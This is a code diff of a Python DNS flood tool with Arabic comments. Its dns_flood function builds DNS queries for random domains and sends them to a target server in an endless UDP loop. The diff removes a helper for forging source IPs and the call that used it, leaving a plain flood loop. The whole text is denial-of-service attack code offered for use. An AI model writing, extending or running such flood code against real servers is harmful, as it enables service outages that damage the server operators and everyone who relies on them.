@@ -20,14 +20,9 @@ print(f'''
 def generate_random_domain():
     return ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(5, 15))) + ".com"
 
-# دالة لتوليد IP وهمي (إن كنت ترغب في التزوير)
-def generate_fake_ip():
-    return ".".join(map(str, (random.randint(1, 254) for _ in range(4))))  # تجنب IP broadcast
-
 # هجوم DNS
 def dns_flood(target_ip, target_port=53):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # استخدام UDP لأن DNS يعتمد عليه
-    fake_ip = generate_fake_ip()  # IP مزيف
     try:
         while True:
             domain = generate_random_domain()
@@ -44,9 +39,9 @@ def dns_flood(target_ip, target_port=53):
                 request += bytes([len(part)]) + part.encode("utf-8")
             request += b"\x00" + query_type + b"\x00\x01"  # Query class: IN
 
-            # استخدام IP المزيف في الهجوم
-            sock.sendto(request, (target_ip, target_port), 0, (fake_ip, 0))
-            print(f"{F.CYAN}Request Sent!{F.RESET} | Fake IP: {F.YELLOW}{fake_ip}{F.RESET} | Domain: {F.GREEN}{domain}{F.RESET}", flush=True)
+            # إرسال الطلب إلى خادم DNS المستهدف
+            sock.sendto(request, (target_ip, target_port))
+            print(f"{F.CYAN}Request Sent!{F.RESET} | Domain: {F.GREEN}{domain}{F.RESET}", flush=True)
     except Exception as e:
         print(f"{F.RED}Error: {e}{F.RESET}", flush=True)
 
